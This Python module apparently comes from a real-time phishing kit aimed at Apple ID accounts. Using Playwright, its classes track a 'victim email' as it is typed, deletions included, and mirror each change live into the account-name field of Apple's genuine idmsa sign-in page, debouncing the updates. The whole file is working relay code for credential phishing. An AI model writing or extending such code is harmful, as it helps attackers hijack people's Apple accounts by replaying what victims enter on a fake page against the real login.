"""Victim email -> Apple idmsa field: one authoritative string, no partial regressions."""

from __future__ import annotations

import threading
from typing import Callable

from playwright.sync_api import Error as PlaywrightError
from playwright.sync_api import Page


class VictimEmailState:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._value = ''
        self._last_seq = 0

    def get(self) -> str:
        with self._lock:
            return self._value

    def set_authoritative(self, value: str) -> None:
        with self._lock:
            self._value = (value or '').strip()

    def best_of(self, *candidates: str) -> str:
        best = self.get()
        for c in candidates:
            c = (c or '').strip()
            if len(c) > len(best):
                best = c
            elif c and not best:
                best = c
        return best

    def ingest_event(self, value: str, seq: int = 0) -> None:
        value = value or ''
        with self._lock:
            if seq:
                if seq < self._last_seq:
                    return
                self._last_seq = seq
                self._value = value
                return
            cur = self._value
            if value == cur:
                return
            if len(value) > len(cur):
                self._value = value
            elif not cur:
                self._value = value
            elif value and cur and not cur.startswith(value) and not value.startswith(cur):
                self._value = value
            elif cur.startswith(value) or len(value) < len(cur):
                self._value = value

    def reconcile_apple(
        self,
        apple: Page,
        frame,
        find_frame: Callable,
        prepare_fn: Callable,
    ) -> None:
        target = self.get().strip()
        if not target:
            return
        frame = find_frame(apple, frame)
        if not frame:
            return
        try:
            loc = frame.locator('#account_name_text_field')
            if loc.count() == 0 or not loc.is_visible(timeout=500):
                return
            current = (loc.input_value(timeout=1000) or '').strip()
            if current == target:
                return
            if current != target:
                prepare_fn(frame, target)
        except PlaywrightError:
            pass


class AppleEmailLiveSync:
    """Debounced push of victim email string to Apple (seq-authoritative, includes deletes)."""

    def __init__(self, min_interval_s: float = 0.18) -> None:
        self._min = min_interval_s
        self._last_pushed = ''
        self._last_at = 0.0

    def should_push(self, target: str, *, force: bool = False) -> bool:
        target = target if target is not None else ''
        if force:
            return True
        if target == self._last_pushed:
            return False
        import time

        if len(target) > len(self._last_pushed):
            return True
        return time.time() - self._last_at >= self._min

    def mark_pushed(self, target: str) -> None:
        import time

        self._last_pushed = target if target is not None else ''
        self._last_at = time.time()
